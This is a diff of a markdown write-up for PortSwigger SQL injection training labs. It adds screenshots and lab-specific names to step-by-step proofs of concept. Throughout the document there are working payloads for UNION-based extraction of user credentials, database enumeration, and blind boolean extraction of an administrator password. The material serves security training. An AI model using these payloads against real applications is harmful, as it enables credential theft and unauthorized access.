@@ -10,16 +10,8 @@
 
 ### Proof of concept
 
-1. Use Burp Suite to intercept and modify the request that sets the product category filter. 
-
-![Basic SQLi](../../_static/images/sqli-basic4.png)
-
+1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Modify the category parameter, adding a `'`
-
-![Basic SQLi](../../_static/images/sqli-basic5.png)
-
-Bingo! 
-
 3. Create payload, submit the request, and verify that the response now contains additional items.
 
 ```text
@@ -51,7 +43,7 @@ SELECT * FROM users WHERE username = 'administrator' AND password = '' OR 1=1 --
 
 Or modify it in the URL:
 
-![Basic SQLi](../../_static/images/sqli-basic6.png)
+![Basic SQLi](../../_static/images/sqlic.png)
 
 ### Exploitability
 
@@ -71,6 +63,9 @@ An attacker needs to perform an SQL injection attack that logs in to the applica
 2. Modify the category parameter, giving it the value `'+UNION+SELECT+NULL--`. Note that an error occurs.
 3. Modify the category parameter to add another column containing a null value: `'+UNION+SELECT+NULL,NULL--`
 4. Continue adding null values until the error disappears and the response includes additional content containing the null values.
+
+![SQLi](../../_static/images/sqli1.png)
+![SQLi](../../_static/images/sqli2.png)
 
 ### Exploitability
 
@@ -93,6 +88,10 @@ The lab will provide a random value that you need to make appear within the quer
 3. Try replacing each null with the random value provided by the lab, for example: `'+UNION+SELECT+'abcdef',NULL,NULL--`
 4. If an error occurs, move on to the next null and try that instead.
 
+![SQLi](../../_static/images/sqli3.png)
+![SQLi](../../_static/images/sqli4.png)
+![SQLi](../../_static/images/sqli5.png)
+
 ### Exploitability
 
 An attacker needs to perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps determine which columns are compatible with string data. 
@@ -103,7 +102,7 @@ An attacker needs to perform an SQL injection UNION attack that returns an addit
 
 ### Description
 
-[This lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables) contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
+[This lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables) contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, it is possible to use a UNION attack to retrieve data from other tables. 
 
 The database contains a different table called users, with columns called username and password.
 
@@ -113,6 +112,9 @@ The database contains a different table called users, with columns called userna
 2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: `'+UNION+SELECT+'abc','def'--`
 3. Use the following payload to retrieve the contents of the users table: `'+UNION+SELECT+username,+password+FROM+users--`
 4. Verify that the application's response contains usernames and passwords.
+5. Log in as administrator.
+
+![SQLi](../../_static/images/sqli6.png)
 
 ### Exploitability
 
@@ -124,7 +126,7 @@ An attacker needs to perform an SQL injection UNION attack that retrieves all us
 
 ### Description
 
-[This lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column) contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+[This lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column) contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, it is possible to use a UNION attack to retrieve data from other tables.
 
 The database contains a different table called users, with columns called username and password.
 
@@ -136,6 +138,8 @@ The database contains a different table called users, with columns called userna
 4. Verify that the application's response contains usernames and passwords.
 5. Log in as administrator.
 
+![SQLi](../../_static/images/sqli7.png)
+
 ### Exploitability
 
 An attacker needs to perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
@@ -146,13 +150,15 @@ An attacker needs to perform an SQL injection UNION attack that retrieves all us
 
 ### Description
 
-[This lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle) contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+[This lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle) contains an SQL injection vulnerability in the product category filter. It is possible to use a UNION attack to retrieve the results from an injected query.
 
 ### Proof of concept
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: `'+UNION+SELECT+'abc','def'+FROM+dual--`
 3. Use the following payload to display the database version: `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
+
+![SQLi](../../_static/images/sqli8.png)
 
 ### Exploitability
 
@@ -172,13 +178,17 @@ An attacker will need to display the database version string.
 2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: `'+UNION+SELECT+'abc','def'#`
 3. Use the following payload to display the database version: `'+UNION+SELECT+@@version,+NULL#`
 
+![SQLi](../../_static/images/sqli9.png)
+...
+![SQLi](../../_static/images/sqli10.png)
+
 ----
 
 ## SQL injection attack, listing the database contents on non-Oracle databases
 
 ### Description
 
-[This lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle) contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+[This lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle) contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so it is possible to use a UNION attack to retrieve data from other tables.
 
 ### Proof of concept
 
@@ -199,17 +209,19 @@ An attacker will need to display the database version string.
 5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
 
 ```text
-'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_okfnmf'--
 ```
     
 6. Find the names of the columns containing usernames and passwords.
 7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
 
 ```text
-'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+'+UNION+SELECT+username_uoclxg,+password_slibfj+FROM+users_okfnmf--
 ```
     
 8. Find the password for the administrator user, and use it to log in.
+
+![SQLi](../../_static/images/sqli11.png)
 
 ### Exploitability
 
@@ -221,7 +233,7 @@ The application has a login function, and the database contains a table that hol
 
 ### Description
 
-[This lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle) contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+[This lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle) contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so it is possible to use a UNION attack to retrieve data from other tables.
 
 ### Proof of concept
 
@@ -242,17 +254,19 @@ The application has a login function, and the database contains a table that hol
 5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
 
 ```text
-'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_GYCDOW'--
 ```
     
 6. Find the names of the columns containing usernames and passwords.
 7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
 
 ```text
-'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+'+UNION+SELECT+USERNAME_WWIUXV,+PASSWORD_GFLFLH+FROM+USERS_GYCDOW--
 ```
     
 8. Find the password for the administrator user, and use it to log in.
+
+![SQLi](../../_static/images/sqli12.png)
 
 ### Exploitability
 
@@ -272,67 +286,87 @@ The database contains a different table called users, with columns called userna
 
 ### Proof of concept
 
-1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.
-2. Modify the TrackingId cookie, changing it to: `TrackingId=xyz' AND '1'='1`. Verify that the "Welcome back" message appears in the response. 
-3. Now change it to: `TrackingId=xyz' AND '1'='2`. Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result. 
-4. Now change it to: `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`. Verify that the condition is true, confirming that there is a table called users. 
-5. Now change it to: 
+1. Confirm `TrackingId` parameter is vulnerable: Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. 
 
 ```text
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+Cookie: TrackingId=S9WyqgAr2aZposiE; session=2IsD4KyEz4hxnNcI3RdIZbsVggIw71c5
 ```
 
-Verify that the condition is true, confirming that there is a user called `administrator`. 
+2. Send to Repeater. Change the TrackingId cookie to: `TrackingId=S9WyqgAr2aZposiE' AND '1'='1`. The "Welcome back" message appears in the response. 
+3. Now change it to: `TrackingId=S9WyqgAr2aZposiE' AND '1'='2`. The "Welcome back" message does not appear in the response. This confirms `TrackingId` is a vulnerable parameter.
+4. Confirm there is a `users` table. Now change it to: `TrackingId=S9WyqgAr2aZposiE' AND (SELECT 'a' FROM users LIMIT 1)='a`. There is a "Welcome Back" so the condition is true, confirming that there is a table called `users`. 
+5. Now confirm that the username `administrator` exists in the `users` table. Change the `TrackingId` parameter to: 
+
+```text
+TrackingId=S9WyqgAr2aZposiE' AND (SELECT username FROM users WHERE username='administrator')='administrator'--'
+```
+
+"Welcome back", so the condition is true, confirming that there is a user called `administrator`. 
 
 6. The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
 
 ```text
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+TrackingId=S9WyqgAr2aZposiE' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--'
 ```
-    
-This condition should be true, confirming that the password is greater than 1 character in length.
 
 7. Send a series of follow-up values to test different password lengths. Send:
 
 ```text
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+TrackingId=S9WyqgAr2aZposiE' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>2)='administrator'--'
 ```
 
 ```text
-TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+TrackingId=S9WyqgAr2aZposiE' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>3)='administrator'--'
 ```
 
-And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.
+Etcetera. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is 20 characters long.
 
-8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
+Request:
+![SQLi](../../_static/images/sqli13.png)
+
+Response:
+![SQLi](../../_static/images/sqli14.png)
+
+8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests. Send the request you are working on to Burp Intruder, using the context menu.
 9. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
 10. In the Positions tab, change the value of the cookie to:
 
 ```text
-TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+TrackingId=S9WyqgAr2aZposiE' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
 ```
     
-This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
+This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. The attack will cycle through each position and possible value, testing each one in turn.
 
-11. Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
+11. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the "Add §" button:
 
 ```text
-TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+TrackingId=S9WyqgAr2aZposiE'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users WHERE+username&3d'administrator')%3d'§a§'--
 ```
 
-12. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
-13. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".
+![SQLi](../../_static/images/sqli15.png)
+
+
+12. To test the character at each position, send suitable payloads in the payload position defined. For this lab, assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Bruteforcer" is selected, and under "Payload Options" the range a-z and 0-9 are by default set. 
+
+![SQLi](../../_static/images/sqli16.png)
+
+13. To be able to tell when the correct character was submitted, grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".
+
+![SQLi](../../_static/images/sqli17.png)
+
 14. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
 15. Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
-16. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
+16. Re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from `1` to `2`:
 
 ```text
-TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+TrackingId=S9WyqgAr2aZposiE'+AND+(SELECT+SUBSTRING(password,2,1)+FROM+users WHERE+username&3d'administrator')%3d'§a§'--
 ```
 
 17. Launch the modified attack, review the results, and note the character at the second offset.
-18. Continue this process testing offset 3, 4, and so on, until you have the whole password.
+18. Continue this process testing offset `3`, `4`, and so on, until `20` and you have the whole password.
 19. In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.
+
+![SQLi](../../_static/images/sqli18.png)
 
 ----
 
